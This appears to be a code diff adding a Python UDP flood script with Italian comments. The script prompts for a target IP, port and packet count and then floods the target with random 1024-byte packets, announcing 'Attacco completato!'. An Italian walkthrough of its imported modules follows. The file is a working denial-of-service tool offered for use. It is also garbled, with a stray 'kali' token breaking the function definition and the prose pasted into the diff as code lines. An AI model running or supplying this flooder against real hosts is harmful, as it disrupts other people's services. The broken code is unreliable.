@@ -1,0 +1,48 @@
+import socket
+import random
+import threading
+
+def send_packet(target_ip, target_port, num_packets):kali
+    try:
+        # Creazione di un socket UDP
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        # Genera dati casuali da inviare
+        bytes_to_send = random._urandom(1024)  # 1024 byte
+
+        print(f"Inizio invio di {num_packets} pacchetti a {target_ip}:{target_port}")
+
+        for i in range(num_packets):
+            sock.sendto(bytes_to_send, (target_ip, target_port))
+            if i % 100 == 0:
+                print(f"Inviati {i} pacchetti...")
+
+        print("Attacco completato!")
+
+    except Exception as e:
+        print(f"Errore: {e}")
+
+if __name__ == "__main__":
+    # Input dall'utente
+    target_ip = input("Inserisci l'IP del target: ")
+    target_port = int(input("Inserisci la porta del target: "))
+    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
+
+    # Avvia un thread per inviare i pacchetti
+    thread = threading.Thread(target=send_packet, args=(target_ip, target_port, num_packets))
+    thread.start()
+    thread.join()
+
+Ecco una spiegazione dei moduli importati nello script:
+
+import socket:
+Fornisce l'accesso alle funzionalità di rete.
+Permette di creare socket per comunicare su Internet usando protocolli come UDP o TCP.
+Nello script, viene utilizzato per creare un socket UDP con socket.socket(socket.AF_INET, socket.SOCK_DGRAM).
+
+import random:
+Offre funzioni per generare numeri casuali e dati casuali.
+In questo script, viene usata random._urandom(1024) per creare un blocco di 1024 byte di dati casuali da inviare con ogni pacchetto UDP.
+
+import threading:
+Consente di eseguire codice in parallelo attraverso thread.
+Utilizzato nello script per avviare il processo di invio dei pacchetti in un thread separato. Questo aiuta a gestire più operazioni contemporaneamente senza bloccare il programma principale.
